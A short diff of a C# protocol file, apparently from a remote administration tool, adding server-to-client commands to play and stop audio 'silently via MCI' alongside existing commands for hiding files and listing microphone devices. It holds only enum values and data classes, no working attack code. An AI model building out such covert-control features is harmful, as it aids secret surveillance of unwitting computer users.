@@ -82,7 +82,9 @@ public enum PacketType
     FmHashResult = 140,  // client→server: {Path, Hash, Error}
     FmAck        = 141,  // client→server: {Path, Success, Error}
     FmShowHide   = 142,  // server→client: toggle hidden attr {Path, Hide}
-    FmSetAttr    = 143,  // server→client: set file attributes {Path, Attributes}
+    FmSetAttr        = 143,  // server→client: set file attributes {Path, Attributes}
+    FmPlayAudio      = 144,  // server→client: play audio silently via MCI {Path}
+    FmPlayAudioStop  = 145,  // server→client: stop silent audio
 
     // Microphone
     MicGetDevices    = 150,  // server→client: request device list
@@ -439,6 +441,7 @@ public class FmHashResultData { public string Path { get; set; } = string.Empty;
 public class FmAckData        { public string Path { get; set; } = string.Empty; public bool Success { get; set; } public string Error { get; set; } = string.Empty; }
 public class FmShowHideData   { public string Path { get; set; } = string.Empty; public bool Hide { get; set; } }
 public class FmSetAttrData    { public string Path { get; set; } = string.Empty; public int Attributes { get; set; } }
+public class FmPlayAudioData  { public string Path { get; set; } = string.Empty; }
 
 // ── Microphone ────────────────────────────────────────
 public class MicDevice           { public int Index { get; set; } public string Name { get; set; } = string.Empty; }
